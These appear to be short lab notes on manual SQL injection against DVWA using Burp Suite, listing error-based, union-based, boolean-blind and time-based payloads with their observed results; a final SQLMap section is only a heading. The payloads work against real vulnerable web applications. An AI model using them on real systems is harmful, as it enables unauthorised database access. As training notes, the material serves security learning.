A. SQLi (**DVWA & Burp Suite**) -> Manual

1. Classic SQLi (Error-Based)
id=1 -> shows 1 record
id=1' -> error
id=1' OR '1'='1 -> shows all records

2. Union-Based SQLi
id=1' ORDER BY 1# , 2# , ... until error occurs (confirms column count)
id=1' ORDER BY 3# -> error (2 columns here)
id=1' UNION SELECT 1,2# -> shows output of 2 columns (confirms union sqli works)
id=1' UNION SELECT @@version,2# -> db version leaked 

3. Blind SQLi (Boolean-Based)
id=1' AND 1=1# -> data returned
id=1' AND 1=2# -> no error but no data returned as well 

4. Time-Based Blind SQLi
id=1' AND SLEEP(5)# -> response delayed by 5 secs, no data returned


B. SQLi (**SQLMap**) -> Automated


